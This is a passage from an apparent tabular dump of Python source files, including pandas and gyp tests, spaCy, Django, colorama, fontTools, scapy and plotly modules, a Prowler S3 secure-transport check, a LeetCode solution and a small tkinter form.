    arr_nano = dta_nano._ndarray

    arr = arr_nano.astype(f""M8[{unit}]"")
    if dti_nano.tz is None:
        dtype = arr.dtype
    else:
        dtype = type(dti_nano.dtype)(tz=dti_nano.tz, unit=unit)
    dta = type(dta_nano)._simple_new(arr, dtype=dtype)
    dti = DatetimeIndex(dta, name=dti_nano.name)
    assert dti.dtype == dtype
    return dti


@pytest.mark.filterwarnings(""ignore::DeprecationWarning"")
@pytest.mark.parametrize(""tz"", [None, ""Asia/Shanghai"", ""Europe/Berlin""])
@pytest.mark.parametrize(""name"", [None, ""my_dti""])
@pytest.mark.parametrize(""unit"", [""ns"", ""us"", ""ms"", ""s""])
def test_dti_snap(name, tz, unit):
    dti = DatetimeIndex(
        [
            ""1/1/2002"",
            ""1/2/2002"",
            ""1/3/2002"",
            ""1/4/2002"",
            ""1/5/2002"",
            ""1/6/2002"",
            ""1/7/2002"",
        ],
        name=name,
        tz=tz,
        freq=""D"",
    )
    dti = astype_non_nano(dti, unit)

    result = dti.snap(freq=""W-MON"")
    expected = date_range(""12/31/2001"", ""1/7/2002"", name=name, tz=tz, freq=""w-mon"")
    expected = expected.repeat([3, 4])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None

    result = dti.snap(freq=""B"")

    expected = date_range(""1/1/2002"", ""1/7/2002"", name=name, tz=tz, freq=""b"")
    expected = expected.repeat([1, 1, 1, 2, 2])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None"
JD48	JD48-solution.py	"from typing import List
from collections import deque

class Solution:
    def maxAreaofIsland(self, grid: List[List[int]]) -> int:
        row = len(grid)
        col = len(grid[0])
        biggest_island = 0
        visited = [[False for i in range(col)] for j in range(row)]
        for i in range(row):
            for j in range(col):
                if grid[i][j] == 1 and visited[i][j] is False:
                    island_area = self.visitIsland(grid, visited, i,j)
                    biggest_island = max(island_area,biggest_island)
        return biggest_island

    def visitIsland(self, grid: List[List[int]], visited: List[List[int]], i: int, j: int) -> int:
        neighbours = deque([(i,j)])
        area = 0
        while neighbours:
            row,col = neighbours.popleft()
            if row < 0 or row >= len(grid) or col < 0 or col >= len(grid[0]):
                continue
            if visited[row][col] is False and grid[row][col] == 1:
                visited[row][col] = True
                area += 1
                neighbours.extend([(row + 1,col)])
                neighbours.extend([(row - 1, col)])
                neighbours.extend([(row, col + 1)])
                neighbours.extend([(row, col - 1)])
        return area

if __name__ == '__main__':
    solution = Solution()
    case1 = [[0,0,0,0,0,0,0,0]]
    assert solution.maxAreaofIsland(case1) == 0

    case2 = [[0,0,1,0,0,0,0,1,0,0,0,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,1,1,0,1,0,0,0,0,0,0,0,0],[0,1,0,0,1,1,0,0,1,0,1,0,0],
             [0,1,0,0,1,1,0,0,1,1,1,0,0],[0,0,0,0,0,0,0,0,0,0,1,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,0,0,0,0,0,0,1,1,0,0,0,0]]
    assert solution.maxAreaofIsland(case2) == 6

    case3 = [[1, 1, 1, 0, 0], [0, 1, 0, 0, 1], [0, 0, 1, 1, 0], [0, 1, 1, 0, 0], [0, 0, 1, 0, 0]]

    assert solution.maxAreaofIsland(case3) == 5"
JY182	JY182-pydevd_thread_wrappers.py	"from _pydev_bundle._pydev_saved_modules import threading


def wrapper(fun):

    def pydev_after_run_call():
        pass

    def inner(*args, **kwargs):
        fun(*args, **kwargs)
        pydev_after_run_call()

    return inner


def wrap_attr(obj, attr):
    t_save_start = getattr(obj, attr)
    setattr(obj, attr, wrapper(t_save_start))
    obj._pydev_run_patched = True


class ObjectWrapper(object):

    def __init__(self, obj):
        self.wrapped_object = obj
        try:
            import functools
            functools.update_wrapper(self, obj)
        except:
            pass

    def __getattr__(self, attr):
        orig_attr = getattr(self.wrapped_object, attr)  # .__getattribute__(attr)
        if callable(orig_attr):

            def patched_attr(*args, **kwargs):
                self.call_begin(attr)
                result = orig_attr(*args, **kwargs)
                self.call_end(attr)
                if result == self.wrapped_object:
                    return self
                return result

            return patched_attr
        else:
            return orig_attr

    def call_begin(self, attr):
        pass

    def call_end(self, attr):
        pass

    def __enter__(self):
        self.call_begin(""__enter__"")
        self.wrapped_object.__enter__()
        self.call_end(""__enter__"")

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.call_begin(""__exit__"")
        self.wrapped_object.__exit__(exc_type, exc_val, exc_tb)


def factory_wrapper(fun):

    def inner(*args, **kwargs):
        obj = fun(*args, **kwargs)
        return ObjectWrapper(obj)

    return inner


def wrap_threads():
    # TODO: add wrappers for thread and _thread
    # import _thread as mod
    # print(""Thread imported"")
    # mod.start_new_thread = wrapper(mod.start_new_thread)
    threading.Lock = factory_wrapper(threading.Lock)
    threading.RLock = factory_wrapper(threading.RLock)

    # queue patching
    import queue  # @UnresolvedImport
    queue.Queue = factory_wrapper(queue.Queue)"
JD485	JD485-functions.py	"# coding: utf8
from __future__ import unicode_literals

from ..language import component
from ..matcher import Matcher
from ..util import filter_spans


@component(
    ""merge_noun_chunks"",
    requires=[""token.dep"", ""token.tag"", ""token.pos""],
    retokenizes=True,
)
def merge_noun_chunks(doc):
    """"""Merge noun chunks into a single token.

    doc (Doc): The Doc object.
    RETURNS (Doc): The Doc object with merged noun chunks.

    DOCS: https://spacy.io/api/pipeline-functions#merge_noun_chunks
    """"""
    if not doc.is_parsed:
        return doc
    with doc.retokenize() as retokenizer:
        for np in doc.noun_chunks:
            attrs = {""tag"": np.root.tag, ""dep"": np.root.dep}
            retokenizer.merge(np, attrs=attrs)
    return doc


@component(
    ""merge_entities"",
    requires=[""doc.ents"", ""token.ent_iob"", ""token.ent_type""],
    retokenizes=True,
)
def merge_entities(doc):
    """"""Merge entities into a single token.

    doc (Doc): The Doc object.
    RETURNS (Doc): The Doc object with merged entities.

    DOCS: https://spacy.io/api/pipeline-functions#merge_entities
    """"""
    with doc.retokenize() as retokenizer:
        for ent in doc.ents:
            attrs = {""tag"": ent.root.tag, ""dep"": ent.root.dep, ""ent_type"": ent.label}
            retokenizer.merge(ent, attrs=attrs)
    return doc


@component(""merge_subtokens"", requires=[""token.dep""], retokenizes=True)
def merge_subtokens(doc, label=""subtok""):
    """"""Merge subtokens into a single token.

    doc (Doc): The Doc object.
    label (unicode): The subtoken dependency label.
    RETURNS (Doc): The Doc object with merged subtokens.

    DOCS: https://spacy.io/api/pipeline-functions#merge_subtokens
    """"""
    merger = Matcher(doc.vocab)
    merger.add(""SUBTOK"", None, [{""DEP"": label, ""op"": ""+""}])
    matches = merger(doc)
    spans = filter_spans([doc[start : end + 1] for _, start, end in matches])
    with doc.retokenize() as retokenizer:
        for span in spans:
            retokenizer.merge(span)
    return doc"
JY113	JY113-initialise.py	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import atexit
import contextlib
import sys

from .ansitowin32 import AnsiToWin32


orig_stdout = None
orig_stderr = None

wrapped_stdout = None
wrapped_stderr = None

atexit_done = False


def reset_all():
    if AnsiToWin32 is not None:  # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):
    if not wrap and any([autoreset, convert, strip]):
        raise ValueError(""wrap=False conflicts with any other arg=True"")

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = wrap_stream(
            orig_stdout, convert, strip, autoreset, wrap
        )
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = wrap_stream(
            orig_stderr, convert, strip, autoreset, wrap
        )

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr


@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream, convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream"
JY151	JY151-test_traittypes.py	"import pytest
from traitlets import HasTraits, TraitError
from traitlets.utils.importstring import import_item

from notebook.traittypes import (
    InstanceFromClasses,
    TypeFromClasses
)
from notebook.services.contents.largefilemanager import LargeFileManager


class DummyClass:
    """"""Dummy class for testing Instance""""""


class DummyInt(int):
    """"""Dummy class for testing types.""""""


class Thing(HasTraits):

    a = InstanceFromClasses(
        default_value=2,
        klasses=[
            int,
            str,
            DummyClass,
        ]
    )

    b = TypeFromClasses(
        default_value=None,
        allow_none=True,
        klasses=[
            DummyClass,
            int,
            'notebook.services.contents.manager.ContentsManager'
        ]
    )


class TestInstanceFromClasses:

    @pytest.mark.parametrize(
        'value',
        [1, 'test', DummyClass()]
    )
    def test_good_values(self, value):
        thing = Thing(a=value)
        assert thing.a == value

    @pytest.mark.parametrize(
        'value',
        [2.4, object()]
    )
    def test_bad_values(self, value):
        with pytest.raises(TraitError) as e:
            thing = Thing(a=value)


class TestTypeFromClasses:

    @pytest.mark.parametrize(
        'value',
        [DummyClass, DummyInt, LargeFileManager,
            'notebook.services.contents.manager.ContentsManager']
    )
    def test_good_values(self, value):
        thing = Thing(b=value)
        if isinstance(value, str):
            value = import_item(value)
        assert thing.b == value

    @pytest.mark.parametrize(
        'value',
        [float, object]
    )
    def test_bad_values(self, value):
        with pytest.raises(TraitError) as e:
            thing = Thing(b=value)"
JD95	JD95-messages.py	"# Levels
DEBUG = 10
INFO = 20
WARNING = 30
ERROR = 40
CRITICAL = 50


class CheckMessage:

    def __init__(self, level, msg, hint=None, obj=None, id=None):
        assert isinstance(level, int), ""The first argument should be level.""
        self.level = level
        self.msg = msg
        self.hint = hint
        self.obj = obj
        self.id = id

    def __eq__(self, other):
        return (
            isinstance(other, self.__class__) and
            all(getattr(self, attr) == getattr(other, attr)
                for attr in ['level', 'msg', 'hint', 'obj', 'id'])
        )

    def __str__(self):
        from django.db import models

        if self.obj is None:
            obj = ""?""
        elif isinstance(self.obj, models.base.ModelBase):
            # We need to hardcode ModelBase and Field cases because its __str__
            # method doesn't return ""applabel.modellabel"" and cannot be changed.
            obj = self.obj._meta.label
        else:
            obj = str(self.obj)
        id = ""(%s) "" % self.id if self.id else """"
        hint = ""\n\tHINT: %s"" % self.hint if self.hint else ''
        return ""%s: %s%s%s"" % (obj, id, self.msg, hint)

    def __repr__(self):
        return ""<%s: level=%r, msg=%r, hint=%r, obj=%r, id=%r>"" % \
            (self.__class__.__name__, self.level, self.msg, self.hint, self.obj, self.id)

    def is_serious(self, level=ERROR):
        return self.level >= level

    def is_silenced(self):
        from django.conf import settings
        return self.id in settings.SILENCED_SYSTEM_CHECKS


class Debug(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(DEBUG, *args, **kwargs)


class Info(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(INFO, *args, **kwargs)


class Warning(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(WARNING, *args, **kwargs)


class Error(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(ERROR, *args, **kwargs)


class Critical(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(CRITICAL, *args, **kwargs)"
JD262	JD262-physical_entities_state_xml.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

test_xml = """"""
  <data>
    <physical-entities-state xmlns=""http://www.adtran.com/ns/yang/adtran-physical-entities"">
      <physical-entity>
        <a-string>something</a-string>
      </physical-entity>
    </physical-entities-state>
  </data>
""""""

physical_entities_output = """"""
  <data>
    <physical-entities-state xmlns=""http://www.adtran.com/ns/yang/adtran-physical-entities"">
      <physical-entity>
        <name>temperature 0/1</name>
        <availability xmlns=""http://www.adtran.com/ns/yang/adtran-physical-entity-availability"">
          <availability-status/>
        </availability>
        <classification xmlns:adtn-phys-sens=""http://www.adtran.com/ns/yang/adtran-physical-sensors"">adtn-phys-sens:temperature-sensor-celsius</classification>
        <is-field-replaceable>false</is-field-replaceable>
      </physical-entity>
      <physical-entity>
        <name>transceiver 0/1</name>
        <availability xmlns=""http://www.adtran.com/ns/yang/adtran-physical-entity-availability"">
          <availability-status/>
        </availability>
        <classification xmlns:adtn-phys-mod-trans=""http://www.adtran.com/ns/yang/adtran-physical-module-transceivers"">adtn-phys-mod-trans:transceiver</classification>
        <is-field-replaceable>false</is-field-replaceable>
      </physical-entity>
    </physical-entities-state>
  </data>
"""""""
JD370	JD370-T_S_I__0.py	""""""" TSI{0,1,2,3,5} are private tables used by Microsoft Visual TrueType (VTT)
tool to store its hinting source data.

TSI0 is the index table containing the lengths and offsets for the glyph
programs and 'extra' programs ('fpgm', 'prep', and 'cvt') that are contained
in the TSI1 table.
""""""
from . import DefaultTable
import struct

tsi0Format = "">HHL""


def fixlongs(glyphID, textLength, textOffset):
    return int(glyphID), int(textLength), textOffset


class table_T_S_I__0(DefaultTable.DefaultTable):

    dependencies = [""TSI1""]

    def decompile(self, data, ttFont):
        numGlyphs = ttFont[""maxp""].numGlyphs
        indices = []
        size = struct.calcsize(tsi0Format)
        for i in range(numGlyphs + 5):
            glyphID, textLength, textOffset = fixlongs(
                *struct.unpack(tsi0Format, data[:size])
            )
            indices.append((glyphID, textLength, textOffset))
            data = data[size:]
        assert len(data) == 0
        assert indices[-5] == (0xFFFE, 0, 0xABFC1F34), ""bad magic number""
        self.indices = indices[:-5]
        self.extra_indices = indices[-4:]

    def compile(self, ttFont):
        if not hasattr(self, ""indices""):
            # We have no corresponding table (TSI1 or TSI3); let's return
            # no data, which effectively means ""ignore us"".
            return b""""
        data = b""""
        for index, textLength, textOffset in self.indices:
            data = data + struct.pack(tsi0Format, index, textLength, textOffset)
        data = data + struct.pack(tsi0Format, 0xFFFE, 0, 0xABFC1F34)
        for index, textLength, textOffset in self.extra_indices:
            data = data + struct.pack(tsi0Format, index, textLength, textOffset)
        return data

    def set(self, indices, extra_indices):
        # gets called by 'TSI1' or 'TSI3'
        self.indices = indices
        self.extra_indices = extra_indices

    def toXML(self, writer, ttFont):
        writer.comment(""This table will be calculated by the compiler"")
        writer.newline()"
JD351	JD351-s3_bucket_secure_transport_policy.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.s3.s3_client import s3_client


class s3_bucket_secure_transport_policy(Check):
    def execute(self):
        findings = []
        for bucket in s3_client.buckets:
            report = Check_Report_AWS(self.metadata())
            report.region = bucket.region
            report.resource_id = bucket.name
            report.resource_arn = bucket.arn
            # Check if bucket policy enforces SSL
            if not bucket.policy:
                report.status = ""FAIL""
                report.status_extended = f""S3 Bucket {bucket.name} does not have a bucket policy, thus it allows HTTP requests.""
            else:
                report.status = ""FAIL""
                report.status_extended = f""S3 Bucket {bucket.name} allows requests over insecure transport in the bucket policy.""
                for statement in bucket.policy[""Statement""]:
                    if (
                        statement[""Effect""] == ""Deny""
                        and ""Condition"" in statement
                        and (
                            ""s3:PutObject"" in statement[""Action""]
                            or ""*"" in statement[""Action""]
                            or ""s3:*"" in statement[""Action""]
                        )
                    ):
                        if ""Bool"" in statement[""Condition""]:
                            if ""aws:SecureTransport"" in statement[""Condition""][""Bool""]:
                                if (
                                    statement[""Condition""][""Bool""][
                                        ""aws:SecureTransport""
                                    ]
                                    == ""false""
                                ):
                                    report.status = ""PASS""
                                    report.status_extended = f""S3 Bucket {bucket.name} has a bucket policy to deny requests over insecure transport.""

            findings.append(report)
        return findings"
JY341	JY341-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""mesh3d.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY42	JY42-intranges.py	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple

def intranges_from_list(list_):
    # type: (List[int]) -> Tuple[int, ...]
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i+1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i+1]-1:
                continue
        current_range = sorted_list[last_write+1:i+1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)

def _encode_range(start, end):
    # type: (int, int) -> int
    return (start << 32) | end

def _decode_range(r):
    # type: (int) -> Tuple[int, int]
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_, ranges):
    # type: (int, Tuple[int, ...]) -> bool
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos-1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
JY340	JY340-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""ohlc.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD289	JD289-common_test.py	"#!/usr/bin/env python

# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Unit tests for the common.py file.""""""

import gyp.common
import unittest
import sys


class TestTopologicallySorted(unittest.TestCase):
  def test_Valid(self):
    """"""Test that sorting works on a valid graph with one possible order.""""""
    graph = {
        'a': ['b', 'c'],
        'b': [],
        'c': ['d'],
        'd': ['b'],
        }
    def GetEdge(node):
      return tuple(graph[node])
    self.assertEqual(
      gyp.common.TopologicallySorted(graph.keys(), GetEdge),
      ['a', 'c', 'd', 'b'])

  def test_Cycle(self):
    """"""Test that an exception is thrown on a cyclic graph.""""""
    graph = {
        'a': ['b'],
        'b': ['c'],
        'c': ['d'],
        'd': ['a'],
        }
    def GetEdge(node):
      return tuple(graph[node])
    self.assertRaises(
      gyp.common.CycleError, gyp.common.TopologicallySorted,
      graph.keys(), GetEdge)


class TestGetFlavor(unittest.TestCase):
  """"""Test that gyp.common.GetFlavor works as intended""""""
  original_platform = ''

  def setUp(self):
    self.original_platform = sys.platform

  def tearDown(self):
    sys.platform = self.original_platform

  def assertFlavor(self, expected, argument, param):
    sys.platform = argument
    self.assertEqual(expected, gyp.common.GetFlavor(param))

  def test_platform_default(self):
    self.assertFlavor('freebsd', 'freebsd9' , {})
    self.assertFlavor('freebsd', 'freebsd10', {})
    self.assertFlavor('openbsd', 'openbsd5' , {})
    self.assertFlavor('solaris', 'sunos5'   , {});
    self.assertFlavor('solaris', 'sunos'    , {});
    self.assertFlavor('linux'  , 'linux2'   , {});
    self.assertFlavor('linux'  , 'linux3'   , {});

  def test_param(self):
    self.assertFlavor('foobar', 'linux2' , {'flavor': 'foobar'})


if __name__ == '__main__':
  unittest.main()"
JY527	JY527-new_test.py	"import tkinter as tk
import csv

from datetime import *
from tkinter import ttk

toot = tk.Tk()
toot.title('registiration')
w, h = 400, 500
toot.geometry(f'{w}x{h}')

task_name = tk.Label(toot, text='Fullname')
task_name.place(x=20, y=10)

task_entr = tk.Entry(toot, width=22)
task_entr.place(x=100, y=10)

task_name2 = tk.Label(toot, text='Email')
task_name2.place(x=20, y=40)

task_entr2 = tk.Entry(toot, width=22)
task_entr2.place(x=100, y=40)

task_name3 = tk.Label(toot, text='DOB')
task_name3.place(x=20, y=70)

task_entr3 = tk.Entry(toot, width=22)
task_entr3.place(x=100, y=70)

task_name4 = tk.Label(toot, text='Gander')
task_name4.place(x=20, y=100)

task_entr4 = tk.Entry(toot, width=22)
task_entr4.place(x=100, y=100)

task_name5 = tk.Label(toot, text='Phone')
task_name5.place(x=20, y=130)

task_entr5 = tk.Entry(toot, width=22)
task_entr5.place(x=100, y=130)

task_name6 = tk.Label(toot, text='Course')
task_name6.place(x=20, y=160)

task_entr6 = tk.Entry(toot, width=22)
task_entr6.place(x=100, y=160)


def save():
    with open('new_save.csv', 'a') as f:
        header = ['name', 'email', 'dob', 'gander', 'phone', 'course', 'data joined']
        lst = [task_entr.get(),
               task_entr2.get(),
               task_entr3.get(),
               task_entr4.get(),
               task_entr5.get(),
               task_entr6.get(),
               datetime.now()]
        file = csv.writer(f)
        file.writerow(header)
        file.writerow(lst)


add_btn = tk.Button(text='SAVE', command=save).place(x=50, y=200)
add_btn2 = tk.Button(text='Add', command=save).place(x=100, y=200)
add_btn3 = tk.Button(text='Clear', ).place(x=150, y=200)
add_btn4 = tk.Button(text='Exit', command=toot.destroy).place(x=200, y=200)

if __name__ == '__main__':
    toot.mainloop()"
JD74	JD74-rfc3560.py	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# RSAES-OAEP Key Transport Algorithm in CMS
#
# Notice that all of the things needed in RFC 3560 are also defined
# in RFC 4055.  So, they are all pulled from the RFC 4055 module into
# this one so that people looking a RFC 3560 can easily find them.
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc3560.txt
#

from pyasn1_modules import rfc4055

id_sha1 = rfc4055.id_sha1

id_sha256 = rfc4055.id_sha256

id_sha384 = rfc4055.id_sha384

id_sha512 = rfc4055.id_sha512

id_mgf1 = rfc4055.id_mgf1

rsaEncryption = rfc4055.rsaEncryption

id_RSAES_OAEP = rfc4055.id_RSAES_OAEP

id_pSpecified = rfc4055.id_pSpecified

sha1Identifier = rfc4055.sha1Identifier

sha256Identifier = rfc4055.sha256Identifier

sha384Identifier = rfc4055.sha384Identifier

sha512Identifier = rfc4055.sha512Identifier

mgf1SHA1Identifier = rfc4055.mgf1SHA1Identifier

mgf1SHA256Identifier = rfc4055.mgf1SHA256Identifier

mgf1SHA384Identifier = rfc4055.mgf1SHA384Identifier

mgf1SHA512Identifier = rfc4055.mgf1SHA512Identifier

pSpecifiedEmptyIdentifier = rfc4055.pSpecifiedEmptyIdentifier


class RSAES_OAEP_params(rfc4055.RSAES_OAEP_params):
    pass


rSAES_OAEP_Default_Params = RSAES_OAEP_params()

rSAES_OAEP_Default_Identifier = rfc4055.rSAES_OAEP_Default_Identifier

rSAES_OAEP_SHA256_Params = rfc4055.rSAES_OAEP_SHA256_Params

rSAES_OAEP_SHA256_Identifier = rfc4055.rSAES_OAEP_SHA256_Identifier

rSAES_OAEP_SHA384_Params = rfc4055.rSAES_OAEP_SHA384_Params

rSAES_OAEP_SHA384_Identifier = rfc4055.rSAES_OAEP_SHA384_Identifier

rSAES_OAEP_SHA512_Params = rfc4055.rSAES_OAEP_SHA512_Params

rSAES_OAEP_SHA512_Identifier = rfc4055.rSAES_OAEP_SHA512_Identifier"
JY59	JY59-compat.py	"""""""Stuff that differs in different Python versions and platform
distributions.""""""

import logging
import os
import sys

__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]


logger = logging.getLogger(__name__)


def has_tls() -> bool:
    try:
        import _ssl  # noqa: F401  # ignore unused

        return True
    except ImportError:
        pass

    from pip._vendor.urllib3.util import IS_PYOPENSSL

    return IS_PYOPENSSL


def get_path_uid(path: str) -> int:
    """"""
    Return path's uid.

    Does not follow symlinks:
        https://github.com/pypa/pip/pull/935#discussion_r5307003

    Placed this function in compat due to differences on AIX and
    Jython, that should eventually go away.

    :raises OSError: When path is a symlink or can't be read.
    """"""
    if hasattr(os, ""O_NOFOLLOW""):
        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
        file_uid = os.fstat(fd).st_uid
        os.close(fd)
    else:  # AIX and Jython
        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW
        if not os.path.islink(path):
            # older versions of Jython don't have `os.fstat`
            file_uid = os.stat(path).st_uid
        else:
            # raise OSError for parity with os.O_NOFOLLOW above
            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")
    return file_uid


# packages in the stdlib that may have installation metadata, but should not be
# considered 'installed'.  this theoretically could be determined based on
# dist.location (py27:`sysconfig.get_paths()['stdlib']`,
# py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may
# make this ineffective, so hard-coding
stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}


# windows detection, covers cpython and ironpython
WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
JY118	JY118-l2tp.py	"# This file is part of Scapy
# See http://www.secdev.org/projects/scapy for more information
# Copyright (C) Philippe Biondi <phil@secdev.org>
# This program is published under a GPLv2 license

""""""
L2TP (Layer 2 Tunneling Protocol) for VPNs.

[RFC 2661]
""""""

import struct

from scapy.packet import Packet, bind_layers, bind_bottom_up
from scapy.fields import BitEnumField, ConditionalField, FlagsField, \
    PadField, ShortField
from scapy.layers.inet import UDP
from scapy.layers.ppp import PPP


class L2TP(Packet):
    name = ""L2TP""
    fields_desc = [
        FlagsField(""hdr"", 0, 12, ['res00', 'res01', 'res02', 'res03', 'priority', 'offset',  # noqa: E501
                                  'res06', 'sequence', 'res08', 'res09', 'length', 'control']),  # noqa: E501
        BitEnumField(""version"", 2, 4, {2: 'L2TPv2'}),

        ConditionalField(ShortField(""len"", 0),
                         lambda pkt: pkt.hdr & 'control+length'),
        ShortField(""tunnel_id"", 0),
        ShortField(""session_id"", 0),
        ConditionalField(ShortField(""ns"", 0),
                         lambda pkt: pkt.hdr & 'sequence+control'),
        ConditionalField(ShortField(""nr"", 0),
                         lambda pkt: pkt.hdr & 'sequence+control'),
        ConditionalField(
            PadField(ShortField(""offset"", 0), 4, b""\x00""),
            lambda pkt: not (pkt.hdr & 'control') and pkt.hdr & 'offset'
        )
    ]

    def post_build(self, pkt, pay):
        if self.len is None and self.hdr & 'control+length':
            tmp_len = len(pkt) + len(pay)
            pkt = pkt[:2] + struct.pack(""!H"", tmp_len) + pkt[4:]
        return pkt + pay


bind_bottom_up(UDP, L2TP, dport=1701)
bind_bottom_up(UDP, L2TP, sport=1701)
bind_layers(UDP, L2TP, dport=1701, sport=1701)
bind_layers(L2TP, PPP,)"
JD510	JD510-common.py	"from contextlib import contextmanager
import os
import tempfile

import pytest

from pandas.io.pytables import HDFStore

tables = pytest.importorskip(""tables"")
# set these parameters so we don't have file sharing
tables.parameters.MAX_NUMEXPR_THREADS = 1
tables.parameters.MAX_BLOSC_THREADS = 1
tables.parameters.MAX_THREADS = 1


def safe_remove(path):
    if path is not None:
        try:
